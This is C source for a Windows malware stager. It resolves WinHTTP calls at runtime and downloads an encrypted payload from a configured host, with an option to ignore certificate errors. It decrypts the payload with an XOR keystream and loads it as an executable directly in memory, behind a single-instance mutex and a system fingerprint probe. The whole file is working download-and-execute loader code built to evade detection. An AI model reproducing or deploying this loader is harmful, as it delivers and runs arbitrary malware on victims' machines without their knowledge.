#include <windows.h>
#include <winhttp.h>
#include <stdint.h>
#include "../stub/pe_load.h"
#include "../stub/peb_utils.h"
#include "stager_cfg.h"
                            
static void _decrypt(uint8_t *buf, uint32_t len, uint32_t seed) {
    uint32_t  s = seed;
    uint32_t *p = (uint32_t *)buf;
    uint32_t  n = len >> 2;
    for (uint32_t i = 0; i < n; i++) {
        p[i] ^= s;
        s = s * 1664525u + 1013904223u;
    }
    uint8_t *t = buf + (n << 2);
    for (uint32_t i = 0, rem = len & 3u; i < rem; i++)
        t[i] ^= (uint8_t)(s >> (i * 8));
}

typedef HINTERNET (WINAPI *pfnWHO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfnWHC)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
typedef HINTERNET (WINAPI *pfnWHOR)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL      (WINAPI *pfnWHSR)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI *pfnWHRR)(HINTERNET,LPVOID);
typedef BOOL      (WINAPI *pfnWHRD)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI *pfnWHQH)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD);
typedef BOOL      (WINAPI *pfnWHSO)(HINTERNET,DWORD,LPVOID,DWORD);
typedef BOOL      (WINAPI *pfnWHCH)(HINTERNET);

static uint8_t *_fetch(void) {
    HMODULE wh = LoadLibraryA("winhttp.dll");
    if (!wh) return NULL;

    pfnWHO  fnOpen   = (pfnWHO) GetProcAddress(wh, "WinHttpOpen");
    pfnWHC  fnConn   = (pfnWHC) GetProcAddress(wh, "WinHttpConnect");
    pfnWHOR fnOReq   = (pfnWHOR)GetProcAddress(wh, "WinHttpOpenRequest");
    pfnWHSR fnSend   = (pfnWHSR)GetProcAddress(wh, "WinHttpSendRequest");
    pfnWHRR fnRecv   = (pfnWHRR)GetProcAddress(wh, "WinHttpReceiveResponse");
    pfnWHRD fnRead   = (pfnWHRD)GetProcAddress(wh, "WinHttpReadData");
    pfnWHQH fnQHdr   = (pfnWHQH)GetProcAddress(wh, "WinHttpQueryHeaders");
#if STAGER_IGNORE_CERT
    pfnWHSO fnSetOpt = (pfnWHSO)GetProcAddress(wh, "WinHttpSetOption");
#endif
    pfnWHCH fnClose  = (pfnWHCH)GetProcAddress(wh, "WinHttpCloseHandle");
    if (!fnOpen || !fnConn || !fnOReq || !fnSend ||
        !fnRecv || !fnRead || !fnQHdr || !fnClose) return NULL;

    HINTERNET hSes = fnOpen(
        STAGER_UA,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return NULL;

    HINTERNET hCon = fnConn(hSes, STAGER_HOST, (INTERNET_PORT)STAGER_PORT, 0);
    if (!hCon) { fnClose(hSes); return NULL; }

    DWORD req_flags = STAGER_USE_SSL ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = fnOReq(hCon, L"GET", STAGER_PATH,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, req_flags);
    if (!hReq) { fnClose(hCon); fnClose(hSes); return NULL; }

#if STAGER_IGNORE_CERT
    if (fnSetOpt) {
        DWORD fl = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        fnSetOpt(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &fl, sizeof(fl));
    }
#endif

    if (!fnSend(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        fnClose(hReq); fnClose(hCon); fnClose(hSes); return NULL;
    }
    if (!fnRecv(hReq, NULL)) {
        fnClose(hReq); fnClose(hCon); fnClose(hSes); return NULL;
    }

    /* verify HTTP 200 */
    DWORD status = 0, sz = sizeof(DWORD);
    fnQHdr(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
    if (status != 200) {
        fnClose(hReq); fnClose(hCon); fnClose(hSes); return NULL;
    }

    uint8_t *buf = (uint8_t *)VirtualAlloc(
        NULL, PAYLOAD_SIZE + 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { fnClose(hReq); fnClose(hCon); fnClose(hSes); return NULL; }

    DWORD total = 0, got = 0;
    while (total < PAYLOAD_SIZE) {
        got = 0;
        if (!fnRead(hReq, buf + total, PAYLOAD_SIZE - total, &got)) break;
        if (!got) break;
        total += got;
    }

    fnClose(hReq);
    fnClose(hCon);
    fnClose(hSes);

    return (total >= PAYLOAD_SIZE) ? buf : NULL;
}

static DWORD _sys_probe(void) {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD nlen = sizeof(name);
    GetComputerNameA(name, &nlen);
    DWORD fp = si.dwNumberOfProcessors ^ (DWORD)(ms.ullTotalPhys >> 20);
    for (DWORD i = 0; i < nlen; i++) fp = fp * 31u + (unsigned char)name[i];
    return fp;
}

static HANDLE _g_inst = NULL;
static BOOL _acquire_instance(void) {
    _g_inst = CreateMutexA(NULL, TRUE,
        "Global\\{7F3A1C8E-D24B-49AC-B631-E8D5C2A4B9F3}");
    if (!_g_inst) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(_g_inst);
        _g_inst = NULL;
        return FALSE;
    }
    return TRUE;
}

void __stdcall WinMainCRTStartup(void) {
    if (!_acquire_instance()) { ExitProcess(0); return; }

    volatile DWORD fp = _sys_probe();
    (void)fp;

    uint8_t *payload = _fetch();
    if (!payload) { ExitProcess(1); return; }

    _decrypt(payload, PAYLOAD_SIZE, PAYLOAD_SEED);
    pe_load(payload, PAYLOAD_SIZE);
    ExitProcess(0);
}
